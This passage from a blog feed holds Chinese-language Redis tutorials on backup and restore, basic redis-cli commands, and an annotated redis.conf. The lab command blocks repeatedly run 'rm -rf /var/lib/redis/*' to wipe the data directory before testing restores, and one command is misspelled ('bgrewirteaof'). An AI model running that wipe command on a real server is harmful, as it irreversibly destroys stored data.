redis.windows.confredis-server --service-startredis-server --service-stop</code></pre><h2 id="&#x5B9E;&#x6218;&#x7814;&#x7A76;"><a href="#&#x5B9E;&#x6218;&#x7814;&#x7A76;" class="headerlink" title="&#x5B9E;&#x6218;&#x7814;&#x7A76;"></a>&#x5B9E;&#x6218;&#x7814;&#x7A76;</h2><h3 id="SAVE"><a href="#SAVE" class="headerlink" title="SAVE"></a>SAVE</h3><pre><code>rm -rf /var/lib/redis/*redis-cliflushdbset jaking 666get jakingsavequitls /var/lib/redis/redis-cliget jakingdel jakingget jakingquitls /var/lib/redis/systemctl restart redisredis-cliget jaking</code></pre><h3 id="BGSAVE"><a href="#BGSAVE" class="headerlink" title="BGSAVE"></a>BGSAVE</h3><pre><code>rm -rf /var/lib/redis/*redis-cliflushdbset jaking 666get jakingbgsavequitls /var/lib/redis/redis-cliget jakingdel jakingget jakingquitls /var/lib/redis/systemctl restart redisredis-cliget jaking</code></pre><h3 id="BGREWRITEAOF"><a href="#BGREWRITEAOF" class="headerlink" title="BGREWRITEAOF"></a>BGREWRITEAOF</h3><pre><code>rm -rf /var/lib/redis/*redis-cliset jaking 666bgrewirteaofquitls /var/lib/redis/sz /var/lib/redis/appendonly.aofredis-cliget jakingdel jakingget jakingquitsystemctl restart redisredis-cliget jakingquit</code></pre><p><strong>&#x601D;&#x8003;&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x80FD;&#x6062;&#x590D;&#x6570;&#x636E;&#xFF1F;</strong></p><p>rdb&#x662F;&#x5FEB;&#x7167;&#xFF0C;&#x5B9A;&#x671F;&#x628A;redis&#x5185;&#x5B58;&#x6570;&#x636E;&#x5237;&#x5230;dump.rdb</p><p>aof&#x662F;&#x8BB0;&#x5F55;&#x547D;&#x4EE4;</p><p>&#x4E3B;&#x52A8;&#x5220;&#x9664;&#xFF0C;&#x4E0D;&#x80FD;&#x6062;&#x590D;&#xFF01;&#x9664;&#x975E;&#x662F;redis&#x5F02;&#x5E38;&#x3001;&#x91CD;&#x88C5;&#x3001;&#x8FC1;&#x79FB;&#x624D;&#x80FD;&#x6062;&#x590D;&#xFF01;</p><h3 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h3><p><strong>&#x8FC1;&#x79FB;&#x6570;&#x636E;</strong></p><pre><code>rpm -ivh redis-5.0.11-1.el7.remi.x86_64.rpm systemctl start redisrm -rf /var/lib/redis/*cd /var/lib/redisrzredis-cliget jaking</code></pre><p><strong>AOF</strong></p><pre><code>redis-cliset abc 123get abcbgrewriteaofquitlssz appendonly.aof</code></pre><p><strong>&#x8FC1;&#x79FB;&#x6570;&#x636E;</strong></p><pre><code>cat /etc/redis.confchown redis.redis appendonly.aof</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x7684;&amp;#x6570;&amp;#x636E;&amp;#x5907;&amp;#x4EFD;&amp;#x4E0E;&amp;#x6062;&amp;#x590D;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x7684;&amp;#x6570;&amp;#x636E;&amp;#x5907;&amp;#x4EFD;&amp;#x4E0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis基本操作</title>
    <link href="https://marnm.github.io//posts/49fbbc1/"/>
    <id>https://marnm.github.io//posts/49fbbc1/</id>
    <published>2022-06-07T04:49:20.000Z</published>
    <updated>2022-06-07T05:06:31.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x57FA;&#x672C;&#x64CD;&#x4F5C;"><a href="#Redis&#x57FA;&#x672C;&#x64CD;&#x4F5C;" class="headerlink" title="Redis&#x57FA;&#x672C;&#x64CD;&#x4F5C;"></a>Redis&#x57FA;&#x672C;&#x64CD;&#x4F5C;</h1><pre><code class="mbox">[root@ctos7mini ~]&amp; redis-cli -hredis-cli 3.2.5Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]  -h &lt;hostname&gt;      &#x6307;&#x5B9A;&#x4E3B;&#x673A;IP (default: 127.0.0.1).  -p &lt;port&gt;          &#x6307;&#x5B9A;&#x7AEF;&#x53E3;socket&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x901A;&#x4FE1; (default: 6379).  -s &lt;socket&gt;        &#x6307;&#x5B9A;socket&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x7AEF;&#x90FD;&#x5728;&#x540C;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;socket&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x901A;&#x4FE1;  -a &lt;password&gt;      &#x6307;&#x5B9A;&#x8BA4;&#x8BC1;&#x5BC6;&#x7801;.  -r &lt;repeat&gt;        &#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#x6307;&#x5B9A;&#x8FD0;&#x884C;&#x7684;&#x547D;&#x4EE4;N&#x6B21;.  -i &lt;interval&gt;      &#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#x6BCF;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x4F7F;&#x7528;-i&#x9009;&#x9879;&#x6307;&#x5B9A;.  -n &lt;db&gt;            Database number........................&#x7701;&#x7565;...........................................[root@ctos7mini ~]&amp;</code></pre><h2 id="&#x767B;&#x5F55;Redis"><a href="#&#x767B;&#x5F55;Redis" class="headerlink" title="&#x767B;&#x5F55;Redis"></a>&#x767B;&#x5F55;Redis</h2><pre><code class="mbox">[root@ctos7mini ~]&amp; redis-cli127.0.0.1:6379&gt; exit[root@ctos7mini ~]&amp;&#x6216;&#x8005;[root@ctos7mini ~]&amp; redis-cli -h 127.0.0.1127.0.0.1:6379&gt;</code></pre><h2 id="&#x83B7;&#x53D6;Redis&#x5E2E;&#x52A9;"><a href="#&#x83B7;&#x53D6;Redis&#x5E2E;&#x52A9;" class="headerlink" title="&#x83B7;&#x53D6;Redis&#x5E2E;&#x52A9;"></a>&#x83B7;&#x53D6;Redis&#x5E2E;&#x52A9;</h2><pre><code class="mbox">127.0.0.1:6379&gt; helpredis-cli 3.2.5To get help about Redis commands type:      &quot;help @&lt;group&gt;&quot; to get a list of commands in &lt;group&gt;      &quot;help &lt;command&gt;&quot; for help on &lt;command&gt;      &quot;help &lt;tab&gt;&quot; to get a list of possible help topics      &quot;quit&quot; to exitTo set redis-cli perferences:      &quot;:set hints&quot; enable online hints      &quot;:set nohints&quot; disable online hintsSet your preferences in ~/.redisclirc127.0.0.1:6379&gt;&#x6216;&#x8005;,&#x83B7;&#x53D6;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x7684;&#x5E2E;&#x52A9;127.0.0.1:6379&gt; help @string  APPEND key value  summary: Append a value to a key  since: 2.0.0  BITCOUNT key [start end]  summary: Count set bits in a string  since: 2.6.0  BITFIELD key [GET type offset] [SET type offset value] [INCRBY type offset increment] [OVERFLOW WRAP|SAT|FAIL]  summary: Perform arbitrary bitfield integer operations on strings  since: 3.2.0  BITOP operation destkey key [key ...]  summary: Perform bitwise operations between strings  since: 2.6.0 .......................................................&#x7701;&#x7565;...............................................................</code></pre><p><strong>&#x83B7;&#x53D6;&#x5355;&#x4E2A;&#x547D;&#x4EE4;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;</strong></p><pre><code class="mbox">127.0.0.1:6379&gt; help APPEND  APPEND key value                         //&#x547D;&#x4EE4;&#x65B9;&#x6CD5;  summary: Append a value to a key  since: 2.0.0                             //&#x8BF4;&#x660E;&#x6B64;&#x547D;&#x4EE4;&#x5728;&#x54EA;&#x4E2A;&#x7248;&#x672C;&#x4E2D;&#x5F15;&#x5165;&#x7684;   group: string                            //&#x8BE5;&#x547D;&#x4EE4;&#x6240;&#x5C5E;&#x54EA;&#x4E00;&#x4E2A;&#x7EC4;127.0.0.1:6379&gt;</code></pre><p>&#x5E26;<code>@</code>&#x7684;&#x4E3A;&#x7EC4;&#xFF0C;&#x4E0D;&#x5E26;&#x5219;&#x4E3A;&#x547D;&#x4EE4;</p><p><strong>&#x5207;&#x6362;&#x5E93;&#xFF08;&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#xFF09;&#xFF1A;</strong></p><pre><code class="sql">127.0.0.1:6379&gt; select 1 --&#x8868;&#x793A;&#x5207;&#x6362;&#x5230;1&#x53F7;&#x5E93;&#x4E2D;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;0&#x53F7;&#x5E93;&#xFF0C;&#x5171;16&#x4E2A;&#xFF0C;0-15OK127.0.0.1:6379[1]&gt;</code></pre><p><strong>set</strong></p><pre><code class="sql">127.0.0.1:6379&gt; help set  SET key value [EX seconds] [PX milliseconds] [NX|XX] -- &#x547D;&#x4EE4; &#x952E; &#x503C; [EX&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x79D2;s]  summary: Set the string value of a key  since: 1.0.0  group: string127.0.0.1:6379&gt;-- NX &#x5982;&#x679C;&#x4E00;&#x4E2A;&#x952E;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x624D;&#x521B;&#x5EFA;&#x5E76;&#x8BBE;&#x5B9A;&#x503C;&#xFF0C;&#x5426;&#x5219;&#x4E0D;&#x5141;&#x8BB8;&#x8BBE;&#x5B9A;-- XX &#x5982;&#x679C;&#x4E00;&#x4E2A;&#x952E;&#x5B58;&#x5728;&#x5219;&#x8BBE;&#x7F6E;&#x952E;&#x7684;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#x5219;&#x4E0D;&#x521B;&#x5EFA;&#x5E76;&#x4E0D;&#x8BBE;&#x7F6E;&#x5176;&#x503C;-- &#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x952E;&#x5E76;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x4E3A;10&#x79D2;127.0.0.1:6379&gt; set value_1 404 EX 10OK127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1(nil)127.0.0.1:6379&gt;</code></pre><p><strong>&#x83B7;&#x53D6;&#x952E;&#x4E2D;&#x7684;&#x503C;</strong></p><pre><code class="sql">127.0.0.1:6379&gt; help get  GET key  summary: Get the value of a key  since: 1.0.0  group: string127.0.0.1:6379&gt;</code></pre><p><strong>&#x6DFB;&#x52A0;&#x952E;&#x4E2D;&#x7684;&#x503C;</strong></p><pre><code class="sql">127.0.0.1:6379&gt; help append  APPEND key value  summary: Append a value to a key  since: 2.0.0  group: string127.0.0.1:6379&gt;127.0.0.1:6379&gt; append value_1 502(integer) 3127.0.0.1:6379&gt; get value_1&quot;502&quot;127.0.0.1:6379&gt;</code></pre><p><strong>&#x83B7;&#x53D6;&#x503C;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;</strong></p><pre><code class="sql">127.0.0.1:6379&gt; help strlen  STRLEN key  summary: Get the length of the value stored in a key  since: 2.2.0  group: string127.0.0.1:6379&gt;127.0.0.1:6379&gt; strlen value_1(integer) 3127.0.0.1:6379&gt;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Redis&amp;#x57FA;&amp;#x672C;&amp;#x64CD;&amp;#x4F5C;&quot;&gt;&lt;a href=&quot;#Redis&amp;#x57FA;&amp;#x672C;&amp;#x64CD;&amp;#x4F5C;&quot; class=&quot;headerlink&quot; title=&quot;Redis&amp;#x57FA;&amp;#x67
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Redis配置文件详解</title>
    <link href="https://marnm.github.io//posts/f03da4e7/"/>
    <id>https://marnm.github.io//posts/f03da4e7/</id>
    <published>2022-06-07T04:49:09.000Z</published>
    <updated>2022-06-07T05:06:18.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;"><a href="#Redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;" class="headerlink" title="Redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;"></a>Redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;</h1><p><code>/etc/redis.conf</code></p><pre><code class="ini"># &#x6307;&#x5B9A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;# ./redis-server /path/to/redis.conf# &#x6307;&#x5B9A;&#x5185;&#x5B58;&#x5927;&#x5C0F;# &#x901A;&#x5E38;&#x4E3A;&#x4EE5;&#x4E0B;&#x5F62;&#x5F0F;&#xFF1A;## 1k =&gt; 1000 bytes# 1kb =&gt; 1024 bytes# 1m =&gt; 1000000 bytes# 1mb =&gt; 1024*1024 bytes# 1g =&gt; 1000000000 bytes# 1gb =&gt; 1024*1024*1024 bytes## &#x4EE5;&#x4E0A;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;################################## INCLUDES #################################### Redis&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x591A;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;# include /path/to/local.conf# include /path/to/other.conf################################## NETWORK ###################################### &#x76D1;&#x542C;&#x7684;&#x5730;&#x5740;# &#x9ED8;&#x8BA4;&#x76D1;&#x542C;&#x5728;127.0.0.1&#x5730;&#x5740;&#x4E0A;# &#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x4E3A;0.0.0.0&#x5730;&#x5740;&#xFF0C;&#x6216;&#x67D0;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6216;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x591A;&#x4E2A;&#xFF0C;&#x4F7F;&#x7528;&#x7A7A;&#x683C;&#x5206;&#x9694;&#x5373;&#x53EF;# &#x793A;&#x4F8B;&#xFF1A;## bind 192.168.1.100 10.0.0.1# bind 127.0.0.1 ::1# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~bind 127.0.0.1# protected&#x6A21;&#x5F0F;&#xFF1A;# &#x5F53;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#x5F00;&#x542F;&#x5E76;&#x4E14;&#xFF1A;## 1) bind&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x4E3A;&#x5176;&#x4ED6;&#x5730;&#x5740;# 2) &#x6CA1;&#x6709;&#x914D;&#x7F6E;&#x5BC6;&#x7801;## &#x53EA;&#x80FD;&#x672C;&#x673A;&#x8FDE;&#x63A5;# &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x542F;&#x7528;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#x3002; &#x4EC5;&#x5728;&#x4EE5;&#x4E0B;&#x60C5;&#x51B5;&#x4E0B;&#x624D;&#x5E94;&#x7981;&#x7528;&#x5B83;# &#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#xFF0C;&#x8BF7;&#x5173;&#x95ED;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;protected-mode yes# Redis Server&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#xFF0C;&#x9ED8;&#x8BA4;6379# &#x5982;&#x679C;&#x6307;&#x5B9A;&#x7AEF;&#x53E3; 0&#xFF0C;Redis &#x5C06;&#x4E0D;&#x4F1A;&#x4FA6;&#x542C; TCP &#x5957;&#x63A5;&#x5B57;&#x3002;port 6379# &#x6307;&#x5B9A;tcp-backlog&#x7684;&#x957F;&#x5EA6;# &#x8BF4;&#x660E;&#xFF1A;&#x4EFB;&#x4F55;&#x7684;tcp&#x670D;&#x52A1;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x4F7F;&#x7528;&#x5230;tcp-backlog&#x529F;&#x80FD;&#xFF0C;backlog&#x662F;&#x4E00;&#x4E2A;&#x7B49;&#x5F85;&#x961F;&#x5217;&#xFF0C;# &#x6BD4;&#x5982;&#xFF1A;redis&#x7684;&#x5E76;&#x53D1;&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;redis&#x6709;&#x53EF;&#x80FD;&#x8FD0;&#x884C;&#x4E0D;&#x8FC7;&#x6765;&#x65F6;&#xFF0C;&#x5C31;&#x8FDE;&#x63A5;&#x672C;&#x5730;&#x7F13;&#x5B58;&#x7B49;&#x961F;&#x5217;&#x90FD;&#x6EE1;&#x4E86;&#x4EE5;&#x540E;&#xFF0C;&#x5C31;&#x4F1A;&#x4F7F;&#x7528;&#x989D;&#x5916;&#x7684;&#x5B58;&#x50A8;&#x5730;&#x65B9;&#xFF0C;&#x628A;&#x65B0;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x6682;&#x5B58;&#x4E0B;&#x6765;&#xFF0C;# &#x800C;&#x8FD9;&#x4E2A;&#x4F4D;&#x7F6E;&#x5219;&#x79F0;&#x4E3A;backlogtcp-backlog 511# Unix socket.## &#x6307;&#x5B9A;&#x4F7F;&#x7528;sock&#x6587;&#x4EF6;&#x901A;&#x4FE1;&#x53CA;sock&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#xFF0C;# &#x5982;&#x679C;&#x670D;&#x52A1;&#x7AEF;&#x548C;&#x5BA2;&#x6237;&#x90FD;&#x5728;&#x540C;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#x4E0A;&#xFF0C;&#x5EFA;&#x8BAE;&#x6253;&#x5F00;&#x6B64;&#x9879;&#xFF0C;# &#x57FA;&#x4E8E;sock&#x65B9;&#x5F0F;&#x901A;&#x4FE1;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x4EA4;&#x6362;&#xFF0C;&#x6570;&#x636E;&#x4E0D;&#x7528;&#x518D;&#x7ECF;&#x8FC7;TCP/TP&#x534F;&#x8BAE;&#x6808;&#x8FDB;&#x884C;&#x5C01;&#x88C5;&#x3001;&#x62C6;&#x5C01;## unixsocket /tmp/redis.sock# &#x5B9A;&#x4E49;sock&#x6587;&#x4EF6;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;# unixsocketperm 700# &#x8868;&#x793A;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x7A7A;&#x95F2;&#xFF08;&#x975E;&#x6D3B;&#x8DC3;&#x3001;&#x6216;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x4EA4;&#x4E92;&#xFF09;&#x591A;&#x957F;&#x65F6;&#x95F4;&#x5219;&#x8FDE;&#x63A5;&#x8D85;&#x65F6;# 0&#x8868;&#x793A;&#x4E0D;&#x542F;&#x7528;&#x6B64;&#x529F;&#x80FD;timeout 0# TCP keepalive.# &#x5B9A;&#x4E49;&#x662F;&#x5426;&#x542F;&#x7528;tcp-keepalive&#x529F;&#x80FD;# &#x5355;&#x4F4D;(s/&#x79D2;) &#xFF0C;&#x7528;&#x4E8E;&#x53D1;&#x9001;TCP ACKtcp-keepalive 300################################# GENERAL ###################################### &#x8868;&#x793A;redis&#x5E76;&#x4E0D;&#x4F1A;&#x8FD0;&#x884C;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x8FD0;&#x884C;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x5219;&#x628A;no&#xFF0C;&#x6539;&#x4E3A;yes&#x5373;&#x53EF;&#xFF0C;# &#x5982;&#x679C;&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x811A;&#x672C;&#x542F;&#x52A8;&#xFF0C;&#x5373;&#x4F7F;daemonize&#x4E3A;no&#xFF0C;&#x4E5F;&#x4F1A;&#x8FD0;&#x884C;&#x4E3A;&#x4E00;&#x4E2A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;daemonize no# If you run Redis from upstart or systemd, Redis can interact with your# supervision tree. Options:#   supervised no      - no supervision interaction#   supervised upstart - signal upstart by putting Redis into SIGSTOP mode#   supervised systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET#   supervised auto    - detect upstart or systemd method based on#                        UPSTART_JOB or NOTIFY_SOCKET environment variables# Note: these supervision methods only signal &quot;process is ready.&quot;#       They do not enable continuous liveness pings back to your supervisor.supervised no# If a pid file is specified, Redis writes it where specified at startup# and removes it at exit.## When the server runs non daemonized, no pid file is created if none is# specified in the configuration. When the server is daemonized, the pid file# is used even if not specified, defaulting to &quot;/var/run/redis.pid&quot;.## Creating a pid file is best effort: if Redis is not able to create it# nothing bad happens, the server will start and run normally.pidfile /var/run/redis_6379.pid# &#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x7EA7;&#x522B;# debug (&#x5F88;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x5BF9;&#x5F00;&#x53D1;/&#x6D4B;&#x8BD5;&#x5F88;&#x6709;&#x7528;)# verbose (&#x8BB8;&#x591A;&#x5F88;&#x5C11;&#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x4F46;&#x4E0D;&#x50CF;&#x8C03;&#x8BD5;&#x7EA7;&#x522B;&#x90A3;&#x6837;&#x6DF7;&#x4E71;)# notice (&#x9002;&#x5EA6;&#x5197;&#x957F;&#xFF0C;&#x60A8;&#x53EF;&#x80FD;&#x5728;&#x751F;&#x4EA7;&#x4E2D;&#x60F3;&#x8981;&#x4EC0;&#x4E48;)# warning (&#x53EA;&#x8BB0;&#x5F55;&#x975E;&#x5E38;&#x91CD;&#x8981;/&#x5173;&#x952E;&#x7684;&#x6D88;&#x606F;)loglevel notice# &#x5B9A;&#x4E49;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;logfile /var/log/redis/redis.log# &#x8981;&#x542F;&#x7528;&#x5BF9;&#x7CFB;&#x7EDF;&#x8BB0;&#x5F55;&#x5668;&#x7684;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#xFF0C;&#x53EA;&#x9700;&#x5C06; &apos;syslog-enabled&apos; &#x8BBE;&#x7F6E;&#x4E3A;&#x662F;&#xFF0C;# &#x5E76;&#x53EF;&#x9009;&#x62E9;&#x66F4;&#x65B0;&#x5176;&#x4ED6;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x53C2;&#x6570;&#x4EE5;&#x6EE1;&#x8DB3;&#x60A8;&#x7684;&#x9700;&#x8981;&#x3002;# syslog-enabled no# &#x5B9A;&#x4E49;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x6807;&#x8BC6;&#x3002;# syslog-ident redis# &#x6307;&#x5B9A;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x5DE5;&#x5177;&#x3002; &#x5FC5;&#x987B;&#x662F; USER &#x6216; LOCAL0-LOCAL7 &#x4E4B;&#x95F4;&#x3002;# syslog-facility local0# &#x5B9A;&#x4E49;redis&#x9ED8;&#x8BA4;&#x6709;&#x591A;&#x5C11;&#x4E2A;databases&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x4E2D;&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;# dbid is a number between 0 and &apos;databases&apos;-1databases 16################################ SNAPSHOTTING  ################################# &#x5B9A;&#x4E49;RDB&#x7684;&#x6301;&#x4E45;&#x5316;&#x76F8;&#x5173;# Save the DB on disk:##   save &lt;seconds&gt; &lt;changes&gt;##   &#x4F7F;&#x7528;save&#x6307;&#x4EE4;&#xFF0C;&#x5E76;&#x6307;&#x5B9A;&#x6BCF;&#x9694;&#x591A;&#x5C11;&#x79D2;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x751F;&#x591A;&#x5927;&#x53D8;&#x5316;&#xFF0C;&#x8FDB;&#x884C;&#x5B58;&#x50A8;#   number of write operations against the DB occurred.##   &#x5728;&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x884C;&#x4E3A;&#x662F;&#x4FDD;&#x5B58;&#xFF1A;#   &#x8868;&#x793A;&#x5728;900&#x79D2;&#xFF08;15&#x5206;&#x949F;&#x5185;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709;1&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5219;&#x505A;&#x4E00;&#x6B21;&#x5FEB;&#x7167;&#xFF08;&#x6301;&#x4E45;&#x5316;&#xFF09;#   &#x8868;&#x793A;&#x5728;300&#x79D2;&#xFF08;5&#x5206;&#x949F;&#x5185;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709;10&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5219;&#x505A;&#x4E00;&#x6B21;&#x5FEB;&#x7167;&#xFF08;&#x6301;&#x4E45;&#x5316;&#xFF09;#   &#x8868;&#x793A;&#x5728;60&#x79D2;&#xFF08;1&#x5206;&#x949F;&#x5185;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709;10000&#x4E2A;&#x952E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x5219;&#x505A;&#x4E00;&#x6B21;&#x5FEB;&#x7167;&#xFF08;&#x6301;&#x4E45;&#x5316;&#xFF09;##   &#x5982;&#x679C;redis&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x9700;&#x505A;&#x6301;&#x4E45;&#x5316;&#xFF0C;&#x53EA;&#x662F;&#x4F5C;&#x4E3A;&#x7F13;&#x5B58;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6B64;&#x65B9;&#x5F0F;&#x5173;&#x95ED;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;#   save &quot;&quot;save 900 1save 300 10save 60 10000# &#x5728;&#x8FDB;&#x884C;&#x5FEB;&#x7167;&#x5907;&#x4EFD;&#x65F6;&#xFF0C;&#x4E00;&#x65E6;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x7684;&#x8BDD;&#x662F;&#x5426;&#x505C;&#x6B62;&#x5199;&#x64CD;&#x4F5C;stop-writes-on-bgsave-error yes# RDB&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4F7F;&#x7528;&#x538B;&#x7F29;&#xFF0C;&#x538B;&#x7F29;&#x4F1A;&#x6D88;&#x8017;CPU# rdbcompression yes# &#x662F;&#x5426;&#x5BF9;RDB&#x6587;&#x4EF6;&#x505A;&#x6821;&#x9A8C;&#x7801;&#x68C0;&#x6D4B;&#xFF0C;# &#x6B64;&#x9879;&#x5B9A;&#x4E49;&#x5728;redis&#x542F;&#x52A8;&#x65F6;&#x52A0;&#x8F7D;RDB&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5BF9;&#x6587;&#x4EF6;&#x68C0;&#x67E5;&#x6821;&#x9A8C;&#x7801;&#xFF0C;# &#x5728;redis&#x751F;&#x6210;RDB&#x6587;&#x4EF6;&#x65F6;&#x4F1A;&#x751F;&#x6210;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#xFF0C;&#x5728;redis&#x518D;&#x6B21;&#x542F;&#x52A8;&#x6216;&#x88C5;&#x8F7D;RDB&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x662F;&#x5426;&#x68C0;&#x6D4B;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#xFF0C;# &#x5982;&#x679C;&#x68C0;&#x6D4B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x6D88;&#x8017;&#x65F6;&#x95F4;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;redis&#x542F;&#x52A8;&#x65F6;&#x6162;&#xFF0C;&#x4F46;&#x662F;&#x80FD;&#x591F;&#x5224;&#x65AD;RDB&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4EA7;&#x751F;&#x9519;&#x8BEF;# rdbchecksum yes# &#x5B9A;&#x4E49;RDB&#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;# dbfilename dump.rdb# 